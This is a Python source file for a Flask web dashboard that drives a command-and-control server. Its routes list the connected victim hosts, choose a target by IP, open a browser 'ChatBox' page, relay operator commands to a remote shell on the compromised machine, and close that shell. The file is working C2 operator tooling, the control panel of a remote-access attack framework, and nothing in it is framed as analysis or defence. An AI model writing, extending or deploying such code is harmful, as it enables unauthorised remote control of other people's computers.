from flask import *
import os
from Socket.Server import Server


class FlskSevrev(object):
    
    def __init__(self,C2Private,C2Port=555):
        self.app = Flask(
            __name__, 
            static_folder=os.path.join(os.getcwd(),'FlascAplication','test','templates','static')
        )
        self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
        self.c2Server.start()
        self._ruleResetor()
        

    def getshell(self,hostname):
        if self.c2Server.connections.isconnected(hostname):
            return render_template('ChatBox.html',hostname=hostname)
        return make_response("Page not found", 404)
    
    def choseTarget(self):
        data = request.get_json()
        self.c2Server.connections.connctTo = data['ip']
        return {'Status': 'Completed'}


    def listConnections(self):
        return self.c2Server.connections.connections
    
    
    def homePage(self):
        return render_template('Index.html')
    

    def send_message(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['ip'])
        msg = self.c2Server.retriveCommand(connObj,data['message'])
        return {'message': msg}
    
    
    def closeShell(self):
        data = request.get_json()
        connObj = self.c2Server.connections.getConnObj(data['ip'])
        self.c2Server.sendMsg(connObj,b'exit')
        self.c2Server.connections.disconnect(data['ip'])
        return {'Status':"Disconnect"}

    
    def _ruleResetor(self):
        self.app.add_url_rule('/', 'homePage', self.homePage)
        self.app.add_url_rule('/listConnections', 'listConnections', self.listConnections)
        self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
        self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
        self.app.add_url_rule('/closeShell', 'closeShell', self.closeShell, methods=['POST'])
        self.app.add_url_rule('/choseTarget', 'choseTarget', self.choseTarget, methods=['POST'])

